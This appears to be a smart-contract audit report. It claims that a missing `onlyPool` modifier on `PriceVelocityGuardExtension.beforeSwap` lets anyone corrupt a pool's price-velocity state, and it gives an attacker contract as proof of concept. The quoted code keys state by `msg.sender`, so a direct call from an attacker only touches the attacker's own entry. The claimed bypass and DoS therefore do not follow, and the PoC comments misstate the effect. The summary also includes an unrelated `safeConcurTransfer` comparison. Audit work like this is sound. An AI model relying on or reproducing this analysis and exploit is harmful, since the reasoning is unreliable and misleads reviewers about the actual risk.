### Title
`PriceVelocityGuardExtension.beforeSwap` Missing `onlyPool` Modifier Allows Unprivileged State Corruption and Guard Bypass — (`metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol`)

---

### Summary

`PriceVelocityGuardExtension.beforeSwap` overrides the base implementation without re-applying the `onlyPool` modifier. Any external caller can invoke it directly, supplying arbitrary bid/ask prices, and corrupt the per-pool velocity reference state (`lastMidPriceX64`, `lastUpdateBlock`). By pre-setting the reference price to match the current oracle price in the same transaction as a real swap, an attacker silently resets the guard's baseline so the velocity check sees zero change and passes — the exact analog of `safeConcurTransfer` silently capping a transfer to zero instead of reverting.

---

### Finding Description

`BaseMetricExtension` declares `beforeSwap` with the `onlyPool` modifier: [1](#0-0) 

In Solidity, modifiers are **not inherited** when a function is overridden. `PriceVelocityGuardExtension.beforeSwap` overrides the base without re-applying `onlyPool`: [2](#0-1) 

The function immediately assigns `msg.sender` to `pool_` and writes to `priceVelocityState[pool_]` with no pool-identity check: [3](#0-2) 

The velocity check is then skipped entirely when `prevMid == 0` (first call for any address) or when `maxChange == 0`: [4](#0-3) 

Contrast with `OracleValueStopLossExtension.afterSwap`, which also drops `onlyPool` but compensates with `_requireInitialized(msg.sender)` — a check that only passes for addresses the factory has explicitly initialized as pools: [5](#0-4) 

`PriceVelocityGuardExtension` has no equivalent guard.

---

### Impact Explanation

**Guard bypass (bad-price execution):** An attacker reads the current oracle bid/ask off-chain (or within the same transaction from the oracle contract), calls `PriceVelocityGuardExtension.beforeSwap(pool, ..., currentBid, currentAsk, ...)` directly, setting `lastMidPriceX64 = currentMid` and `lastUpdateBlock = block.number`. When the real pool swap executes in the same block, `prevMid` equals the current oracle mid, `delta = 0`, `actualSq = 0 ≤ allowedSq`, and the guard silently passes. If the oracle price is simultaneously at a manipulated or stale level, the velocity guard — the only on-chain circuit breaker for price-velocity anomalies — is neutralized, and the bad price reaches the swap, causing LP losses through adverse execution.

**State-corruption DoS (unusable swap flows):** Conversely, the attacker can set `lastMidPriceX64` to a value far from the current oracle price. Every subsequent legitimate swap will compute a large `actualSq > allowedSq` and revert with `PriceVelocityExceeded`, making the pool's swap function unusable until the pool admin calls `setLastMidPrice` to repair the state. [6](#0-5) 

---

### Likelihood Explanation

The call requires no special role, no token balance, and no privileged setup — any EOA or contract can invoke `beforeSwap` directly. The bypass path (pre-setting the reference price to the current oracle value) can be executed atomically in a single transaction alongside the swap, requiring no multi-block coordination. The DoS path requires only one external call. Both paths are reachable on every pool that has this extension configured.

---

### Recommendation

Re-apply the `onlyPool` modifier on the override, exactly as the base contract declares it:

```solidity
function beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimit,
    uint256 packedSlot0,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata data
) external override onlyPool returns (bytes4) {   // <-- add onlyPool
    ...
}
```

Alternatively, mirror the pattern used in `OracleValueStopLossExtension` and add an explicit pool-registry check at the top of the function body, though re-applying the modifier is simpler and consistent with the rest of the extension system. [7](#0-6) 

---

### Proof of Concept

```solidity
// Attacker contract — no special privileges required
contract VelocityBypass {
    IPriceVelocityGuardExtension immutable guard;
    IMetricOmmPool              immutable pool;

    constructor(address guard_, address pool_) {
        guard = IPriceVelocityGuardExtension(guard_);
        pool  = IMetricOmmPool(pool_);
    }

    function attack(
        uint128 currentBid,   // read from oracle before this tx
        uint128 currentAsk,
        address recipient,
        bool    zeroForOne,
        int128  amount
    ) external {
        // Step 1: Directly call beforeSwap as msg.sender (no pool check).
        //         Sets lastMidPriceX64 = geometric_mid(currentBid, currentAsk)
        //         and lastUpdateBlock  = block.number.
        guard.beforeSwap(
            address(this), recipient, zeroForOne, amount, 0,
            0, currentBid, currentAsk, ""
        );

        // Step 2: Execute the real swap in the same block.
        //         The velocity guard now sees prevMid == currentMid → delta == 0
        //         → actualSq == 0 ≤ allowedSq → guard silently passes.
        pool.swap(recipient, zeroForOne, amount, 0, "");
    }
}
```

After Step 1, `priceVelocityState[pool].lastMidPriceX64` equals the current oracle mid. In Step 2, the pool calls `beforeSwap` on the extension; `prevMid` is the value just written, `blockDiff = 0`, `actualSq = 0`, and the check at line 72 is never triggered — the velocity guard is silently bypassed. [8](#0-7)

### Citations

**File:** metric-periphery/contracts/extensions/base/BaseMetricExtension.sol (L19-24)
```text
  modifier onlyPool() {
    if (!IMetricOmmPoolFactory(FACTORY).isPool(msg.sender)) {
      revert OnlyPool(msg.sender, FACTORY);
    }
    _;
  }
```

**File:** metric-periphery/contracts/extensions/base/BaseMetricExtension.sol (L81-88)
```text
  function beforeSwap(address, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    virtual
    onlyPool
    returns (bytes4)
  {
    revert ExtensionNotImplemented();
  }
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L29-33)
```text
  function setLastMidPrice(address pool_, uint128 newLastMidPriceX64) external onlyPoolAdmin(pool_) {
    PriceVelocityState storage s = priceVelocityState[pool_];
    s.lastMidPriceX64 = newLastMidPriceX64;
    s.lastUpdateBlock = uint64(block.number);
    emit LastMidPriceUpdated(pool_, newLastMidPriceX64);
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L36-58)
```text
  function beforeSwap(
    address,
    address,
    bool,
    int128,
    uint128,
    uint256,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata
  ) external override returns (bytes4) {
    address pool_ = msg.sender;
    (uint256 midPriceX64,) = SwapMath.midAndSpreadFeeX64FromBidAsk(uint256(bidPriceX64), uint256(askPriceX64));
    // casting to `uint128` is safe: geometric mid of two uint128 bid/ask quotes fits uint128 (same bound as pool)
    // forge-lint: disable-next-line(unsafe-typecast)
    uint128 midPrice = uint128(midPriceX64);

    PriceVelocityState storage s = priceVelocityState[pool_];
    uint128 prevMid = s.lastMidPriceX64;
    uint64 prevBlock = s.lastUpdateBlock;

    s.lastMidPriceX64 = midPrice;
    s.lastUpdateBlock = uint64(block.number);
```

**File:** metric-periphery/contracts/extensions/PriceVelocityGuardExtension.sol (L60-76)
```text
    if (prevMid != 0) {
      uint64 maxChange = s.maxChangePerBlockE18;
      if (maxChange != 0) {
        uint256 blockDiff = block.number - prevBlock;

        uint256 delta = midPrice > prevMid ? uint256(midPrice - prevMid) : uint256(prevMid - midPrice);

        uint256 changeE18 = (delta * 1e18) / uint256(prevMid);

        uint256 actualSq = changeE18 * changeE18;
        uint256 allowedSq = uint256(maxChange) * uint256(maxChange) * (1 + blockDiff);

        if (actualSq > allowedSq) {
          revert PriceVelocityExceeded(actualSq, allowedSq);
        }
      }
    }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L199-204)
```text
  ) external override returns (bytes4) {
    // Only the factory can initialize, so an initialized msg.sender is a legit pool — no onlyPool needed.
    _requireInitialized(msg.sender);
    _afterSwapOracleStopLoss(msg.sender, packedSlot0Initial, packedSlot0Final, bidPriceX64, askPriceX64, zeroForOne);
    return IMetricOmmExtensions.afterSwap.selector;
  }
```
